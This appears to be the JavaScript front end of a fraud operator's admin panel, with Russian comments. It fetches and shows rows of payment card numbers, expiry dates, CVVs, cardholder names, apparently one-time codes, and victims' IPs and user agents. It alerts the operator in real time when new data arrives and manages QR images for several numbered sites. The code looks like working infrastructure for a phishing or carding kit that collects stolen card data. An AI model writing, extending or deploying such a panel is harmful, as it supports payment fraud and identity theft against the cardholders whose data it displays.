// Инициализация элементов
const qrModal = document.getElementById('qrModal');
const qrBtn = document.getElementById('qrBtn');
const closeBtn = document.querySelector('.close');
const refreshBtn = document.getElementById('refreshBtn');
const tableBody = document.getElementById('tableBody');

// Получение CSRF токена из cookie
function getCsrfToken() {
    return document.cookie.split('; ')
        .find(row => row.startsWith('XSRF-TOKEN='))
        ?.split('=')[1];
}

// Базовые настройки для fetch запросов
const fetchConfig = {
    credentials: 'include',
    headers: {
        'CSRF-Token': getCsrfToken(),
        'Content-Type': 'application/json'
    }
};

// Обработчики событий
qrBtn.addEventListener('click', () => {
    qrModal.style.display = 'block';
    refreshQRCodes();
});

closeBtn.addEventListener('click', () => {
    qrModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === qrModal) {
        qrModal.style.display = 'none';
    }
});

refreshBtn.addEventListener('click', refreshData);

// Функция обновления QR-кодов
function refreshQRCodes() {
    const qrImages = document.querySelectorAll('.qr-section img');
    qrImages.forEach((img, index) => {
        const timestamp = new Date().getTime();
        img.src = `/qr/${index + 1}?t=${timestamp}`;
    });
}

// Функция загрузки нового QR-кода
async function uploadQR(siteNumber) {
    const fileInput = document.getElementById(`qr${siteNumber}Upload`);
    const file = fileInput.files[0];
    
    if (!file) {
        showNotification('Пожалуйста, выберите файл', 'error');
        return;
    }

    const formData = new FormData();
    formData.append('qrCode', file);
    formData.append('siteNumber', siteNumber);

    try {
        const response = await fetch('/admin/upload-qr', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'CSRF-Token': getCsrfToken()
            },
            body: formData
        });

        const data = await response.json();
        
        if (response.ok) {
            showNotification('QR-код успешно загружен', 'success');
            refreshQRCodes();
        } else {
            showNotification(data.error || 'Ошибка загрузки QR-кода', 'error');
        }
    } catch (error) {
        showNotification('Ошибка при загрузке QR-кода', 'error');
        console.error('Error:', error);
    }
}

// Функция отображения уведомлений
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

// Функция обновления данных таблицы
async function refreshData() {
    try {
        const response = await fetch('/api/data', {
            ...fetchConfig,
            method: 'GET'
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        
        tableBody.innerHTML = '';
        data.forEach(item => {
            const row = document.createElement('tr');
            const sanitizedData = Object.fromEntries(
                Object.entries(item).map(([key, value]) => [
                    key,
                    String(value || '-').replace(/[<>]/g, c => 
                        ({ '<': '&lt;', '>': '&gt;' }[c])
                    )
                ])
            );
            
            row.innerHTML = `
                <td>${sanitizedData.id}</td>
                <td>${sanitizedData.cc_num}</td>
                <td>${sanitizedData.exp}</td>
                <td>${sanitizedData.cvv}</td>
                <td>${sanitizedData.cardholder}</td>
                <td>${sanitizedData.code || '-'}</td>
                <td>${sanitizedData.site}</td>
                <td>${sanitizedData.ip}</td>
                <td>${sanitizedData.ua}</td>
                <td>${sanitizedData.referer}</td>
            `;
            tableBody.appendChild(row);
        });
    } catch (error) {
        showNotification('Ошибка при обновлении данных', 'error');
        console.error('Error:', error);
    }
}

// Инициализация WebSocket с CSRF токеном
const socket = io({
    withCredentials: true,
    transportOptions: {
        polling: {
            extraHeaders: {
                'CSRF-Token': getCsrfToken()
            }
        }
    }
});

socket.on('connect', () => {
    console.log('Connected to WebSocket server');
    showNotification('Подключено к серверу', 'success');
});

socket.on('newData', () => {
    refreshData();
    showNotification('Получены новые данные', 'info');
});

socket.on('error', (error) => {
    showNotification('Ошибка WebSocket соединения', 'error');
    console.error('WebSocket error:', error);
});

// Обработка ошибок CSRF
window.addEventListener('fetch-error', (e) => {
    if (e.detail.status === 403) {
        showNotification('Ошибка безопасности. Пожалуйста, обновите страницу.', 'error');
    }
});

// Начальная загрузка данных
refreshData(); 